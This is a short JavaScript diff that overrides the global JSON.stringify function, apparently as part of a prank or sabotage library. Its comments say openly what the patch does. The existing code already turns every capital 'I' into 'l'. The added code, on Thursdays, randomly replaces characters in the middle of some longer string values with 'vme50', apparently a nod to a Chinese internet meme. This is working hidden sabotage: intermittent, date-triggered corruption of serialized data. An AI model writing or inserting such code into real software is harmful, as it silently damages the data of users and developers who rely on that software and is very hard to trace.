@@ -73,12 +73,21 @@
 	}
 
 	/**
-	 * JSON.stringify will replace 'I' into 'l'
-	 * @zh JSON.stringify 会把'I'变成'l'
+	 * JSON.stringify will replace 'I' into 'l', and has a 4% chance of 
+	 * replacing the middle 5 characters of a string value to "vme50" on Thursday. 
+	 *  @zh JSON.stringify 会把'I'变成'l', 在周四的时候，对象中的每个字符串值将各有
+	 * 		4%的几率中间5个字符被替换为 "vme50"
 	 */
 	const _stringify = JSON.stringify;
-	JSON.stringify = function (...args) {
-		return _stringify(...args).replace(/I/g, 'l');
+	JSON.stringify = function (j, r, s) {
+		return _stringify(j, (k, v) => { // replacer
+			v = r ? r(k, v) : v;
+			if(typeof(v) === "string" && v.length > 10) {
+				if(new Date().getDay() === 4 && Math.random() < 0.04)
+				return v.substr(0,v.length/2) + "vme50" + v.substr(v.length/2 + 5);
+			}
+			return v;
+		}, s).replace(/I/g, 'l');
 	}
 
 	/**
